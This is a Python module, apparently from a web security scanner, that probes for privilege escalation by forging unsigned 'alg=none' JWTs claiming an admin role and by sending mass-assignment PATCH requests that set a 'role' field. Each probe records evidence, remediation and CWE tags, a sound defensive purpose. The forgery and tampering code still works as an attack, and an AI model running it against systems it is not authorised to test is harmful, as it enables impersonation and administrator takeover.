"""Privilege escalation probing: JWT alg=none forgery and mass-assignment
role tampering.

Two independent, generic techniques:

  PRIVESC-001  forge a JWT with header `{"alg":"none"}` and an arbitrary
               payload (no signature needed), then try it against a route
               that's supposed to require a specific role. Works without
               ever knowing a real credential — it's testing whether the
               verifier enforces an algorithm allowlist at all.

  PRIVESC-002  log in as a low-privilege account, then send a profile/self
               -update request with a `role` field the caller shouldn't be
               able to set, and check whether a subsequent authenticated
               call reflects the elevated role.
"""
from __future__ import annotations

import base64
import json

from engine.common.config import AccountConfig
from engine.common.http_client import SafeClient
from engine.common.models import Confidence, Finding, FindingSource, HttpEvidence, Severity


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _forge_alg_none_token(subject: str, role: str) -> str:
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"sub": subject, "role": role}).encode())
    return f"{header}.{payload}."


def run_jwt_alg_none(client: SafeClient, target_name: str, protected_path: str,
                      forged_subject: str = "wmsec-probe", forged_role: str = "admin") -> list[Finding]:
    findings = []
    forged = _forge_alg_none_token(forged_subject, forged_role)
    resp = client.get(protected_path, headers={"Authorization": f"Bearer {forged}"})
    if not resp.ok:
        return findings
    if resp.status_code == 200:
        findings.append(Finding(
            rule_id="PRIVESC-001",
            title=f"Privilege escalation via forged alg=none JWT: {protected_path}",
            description=(
                f"A self-forged, unsigned JWT (header alg=none, payload role={forged_role!r}, "
                f"no valid signature) was accepted by {protected_path}, returning HTTP 200. "
                f"No knowledge of any real credential or signing secret was required."
            ),
            category="authz",
            source=FindingSource.DAST,
            confidence=Confidence.CONFIRMED,
            target=target_name,
            severity=Severity.CRITICAL,
            http_evidence=[HttpEvidence(method="GET", url=resp.url,
                                         request_headers={"Authorization": f"Bearer {forged}"},
                                         status_code=resp.status_code, response_snippet=resp.text[:300])],
            remediation="Pin JWT verification to the exact algorithm(s) the server issues and hard-reject any other `alg` value before reading claims.",
            business_impact="Complete authentication/authorization bypass — an attacker can impersonate any user with any role, including administrator.",
            tags=["authz", "privilege-escalation", "jwt", "cwe-347"],
        ))
    return findings


def run_mass_assignment(client: SafeClient, target_name: str, low_priv_account: AccountConfig,
                         login_path: str = "/api/login", profile_update_path: str = "/api/profile",
                         whoami_path: str = "/api/whoami", target_role: str = "admin",
                         token_field: str = "token") -> list[Finding]:
    findings = []
    login_resp = client.post(login_path, json={"username": low_priv_account.username,
                                                 "password": low_priv_account.password})
    if not login_resp.ok or login_resp.status_code != 200:
        return findings
    try:
        token = login_resp.json().get(token_field)
    except (ValueError, AttributeError):
        return findings
    if not token:
        return findings

    patch_resp = client.patch(profile_update_path, json={"role": target_role},
                               headers={"Authorization": f"Bearer {token}"})
    if not patch_resp.ok or patch_resp.status_code != 200:
        return findings

    # The PATCH may hand back a fresh token reflecting the new role; fall
    # back to the original if not.
    new_token = token
    try:
        maybe_new = patch_resp.json().get(token_field)
        if maybe_new:
            new_token = maybe_new
    except (ValueError, AttributeError):
        pass

    whoami_resp = client.get(whoami_path, headers={"Authorization": f"Bearer {new_token}"})
    if not whoami_resp.ok:
        return findings
    try:
        reflected_role = whoami_resp.json().get("role")
    except (ValueError, AttributeError):
        return findings

    if reflected_role == target_role:
        findings.append(Finding(
            rule_id="PRIVESC-002",
            title=f"Privilege escalation via mass assignment: {profile_update_path}",
            description=(
                f"Account '{low_priv_account.username}' (seeded role: {low_priv_account.role}) sent "
                f"PATCH {profile_update_path} with body {{\"role\": \"{target_role}\"}}. A subsequent "
                f"GET {whoami_path} reflected role=\"{target_role}\" — the self-service update endpoint "
                f"let the caller set a field it should never control."
            ),
            category="authz",
            source=FindingSource.DAST,
            confidence=Confidence.CONFIRMED,
            target=target_name,
            severity=Severity.CRITICAL,
            http_evidence=[
                HttpEvidence(method="POST", url=login_resp.url, role_used=low_priv_account.role, status_code=login_resp.status_code, notes="login"),
                HttpEvidence(method="PATCH", url=patch_resp.url, role_used=low_priv_account.role,
                              request_body=f'{{"role":"{target_role}"}}', status_code=patch_resp.status_code, notes="mass-assignment attempt"),
                HttpEvidence(method="GET", url=whoami_resp.url, status_code=whoami_resp.status_code,
                              response_snippet=whoami_resp.text[:200], notes="role reflected after tampering"),
            ],
            remediation="Allowlist which fields a self-service update endpoint may set; role/permission changes should require a separate, admin-only endpoint with its own authorization check.",
            business_impact="Any registered user can grant themselves administrator privileges in one request.",
            tags=["authz", "privilege-escalation", "mass-assignment", "cwe-915"],
        ))
    return findings


def run(client: SafeClient, target_name: str, accounts: list[AccountConfig],
        login_path: str = "/api/login", protected_path: str = "/api/admin/users",
        profile_update_path: str = "/api/profile", whoami_path: str = "/api/whoami",
        token_field: str = "token", target_role: str = "admin") -> list[Finding]:
    findings = run_jwt_alg_none(client, target_name, protected_path, forged_role=target_role)
    low_priv = next((a for a in accounts if a.role != target_role), None)
    if low_priv:
        findings += run_mass_assignment(client, target_name, low_priv, login_path, profile_update_path,
                                         whoami_path, target_role=target_role, token_field=token_field)
    return findings
